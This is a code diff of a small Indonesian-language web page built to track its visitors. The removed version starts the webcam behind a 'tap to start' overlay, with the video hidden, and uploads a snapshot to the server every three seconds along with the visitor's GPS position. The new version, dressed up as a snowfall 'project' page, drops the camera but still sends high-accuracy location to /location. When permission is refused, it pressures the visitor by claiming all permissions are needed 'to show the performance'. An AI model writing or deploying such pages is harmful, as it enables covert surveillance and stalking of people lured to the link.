@@ -1,115 +1,105 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Camera + Location</title>
+  <head>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>My Ganzz Project</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script
+src="https://cdnjs.cloudflare.com/ajax/libs/Snowstorm/20131208/snowstorm-min.js"
+      integrity="sha512-rMkLONrw50boYG/6Ku0E8VstfWMRn5D0dX3QZS26Mg0rspYq4EHxYOULuPbv9Be2HBbrrmN8dpPgYUeJ4bINCA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/Snowstorm/20131208/snowstorm.js"
+      integrity="sha512-N8H1tAcm2/wJx02Q3FznOerQj4sFIdQJpmntt0/7ufMLh8dH1DFf7Zss+lbL7JwtYJuGVV+cVmWOdTA4x2lOTg=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <style>
+      body {
+        margin: 0;
+        background: black;
+        color: white;
+        text-align: center;
+        font-family: sans-serif;
+      }
 
-<style>
-body {
-  margin: 0;
-  background: black;
-  color: white;
-  text-align: center;
-}
+      #overlay {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.8);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
 
-#overlay {
-  position: fixed;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.8);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
+      button {
+        padding: 12px 20px;
+        font-size: 16px;
+      }
+    </style>
+  </head>
 
-button {
-  padding: 12px 20px;
-  font-size: 16px;
-}
+  <body>
+    <div id="overlay">
+      <button onclick="start()" class="btn btn-primary" type="submit">Klik untuk mulai</button>
+    </div>
 
-video, canvas {
-  display: none;
-}
-</style>
-</head>
+    <p id="status"></p>
 
-<body>
+    <script>
+      function start() {
+        document.getElementById("overlay").style.display = "none";
+        sendLocation();
+      }
 
-<div id="overlay">
-  <button onclick="start()">Tap untuk mulai</button>
-</div>
+      // 📍 Ambil & kirim lokasi
+      function sendLocation() {
+        const status = document.getElementById("status");
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+        if (!navigator.geolocation) {
+          status.innerText = "Waduh ada error di browsernya";
+          return;
+        }
 
-<script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
+        status.innerText = "Harap Tunggu...";
 
-function start() {
-  document.getElementById("overlay").style.display = "none";
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
 
-  startCamera();
-  sendLocation();
-}
-
-async function startCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    autoCapture();
-  } catch (e) {
-    console.log("Camera error:", e);
-  }
-}
-
-function autoCapture() {
-  const ctx = canvas.getContext("2d");
-
-  setInterval(() => {
-    if (!video.videoWidth) return;
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-    ctx.drawImage(video, 0, 0);
-
-    const img = canvas.toDataURL("image/jpeg", 0.7);
-
-    fetch("/camsnap", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ image: img })
-    });
-
-  }, 3000);
-}
-
-function sendLocation() {
-  if (!navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(
-    (pos) => {
-      fetch("/location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        })
-      });
-    },
-    (err) => {
-      console.log("Location error:", err.message);
-    }
-  );
-}
-</script>
-
-</body>
+            fetch("/location", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                lat: lat,
+                lon: lon,
+                acc: acc,
+              }),
+            })
+              .then((res) => res.text())
+              .then((d) => console.log("Terkirim:", d))
+              .catch((err) => console.log("Error: User Denied", err));
+          },
+          (err) => {
+            status.innerHTML =
+              "<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><strong><h3>Error permission!</strong></h3>" +
+              "<br>Untuk menampilkan pertunjukan pastikan semua <i>izin</i> diberikan";
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 5000,
+            maximumAge: 30000,
+          },
+        );
+      }
+    </script>
+  </body>
 </html>
